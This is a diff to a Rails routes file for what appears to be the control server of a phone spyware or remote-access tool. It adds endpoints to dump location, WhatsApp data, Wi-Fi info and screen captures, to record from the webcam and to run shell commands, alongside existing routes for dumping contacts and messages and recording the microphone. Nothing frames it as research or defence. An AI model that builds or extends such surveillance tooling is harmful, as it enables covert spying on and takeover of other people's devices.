@@ -6,7 +6,11 @@ Rails.application.routes.draw do
         post :dump_contacts
     end
 end
-  resources :geo_locations
+resources :geo_locations do
+  collection do
+      get :dump_location
+  end
+end
   resources :sms_messages do
     collection do
         post :dump_messages
@@ -22,8 +26,17 @@ end
       post :microphone_rec
   end
 end
-  resources :videos
-  resources :screenshots
+resources :messaging_apps_dumps do
+  collection do
+    post :dump_whatsapp_data
+  end
+end
+resources :screenshots do
+  collection do
+      get :dump_screen_snap
+      get :dump_screen_record
+  end
+end
   resources :pictures do
     collection do
         post :take_picture
@@ -48,6 +61,11 @@ end
         post :open_app
         post :upload_file
         post :wake_lock
+        post :dump_wifi_info
+        get :webcam_record
+        get :upload_file
+        get :run_shell_command
+
 
 
 
